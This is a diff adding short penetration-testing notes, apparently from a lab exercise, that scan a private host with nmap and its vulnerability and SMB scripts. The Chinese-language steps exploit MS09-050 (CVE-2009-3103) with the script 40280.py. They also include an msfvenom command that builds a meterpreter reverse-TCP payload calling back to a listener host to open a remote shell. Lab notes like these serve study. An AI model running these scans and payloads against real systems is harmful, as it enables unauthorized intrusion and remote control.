@@ -1,0 +1,19 @@
+nmap -sV -sC -Pn 192.168.199.40 > nmap.txt
+
+nmap --script vuln -sV -p 53,135,139,445,3389,5357,49152,49153,49154,49155,49156,49157,49158 -Pn  192.168.199.40 > nmapvuln.txt
+
+
+
+
+
+nmap --script=smb-vuln* -Pn -p 445 192.168.199.40 > nmapsmb.txt
+nmap --script=smb-vuln-ms17-010 -Pn -p 445 192.168.199.40 > nmapsmb.txt
+
+
+1.nmap掃描出samba服務
+2.使用vuln掃描發現有CVE:CVE-2009-3103
+3.根據CVE搜索到是MS09-050漏洞
+4.根據漏洞編號找到40280.py腳本
+5.生成shell code替換
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.49.199 LPORT=4444  EXITFUNC=thread  -f python
+6.metasploit起監聽取得reverse shell
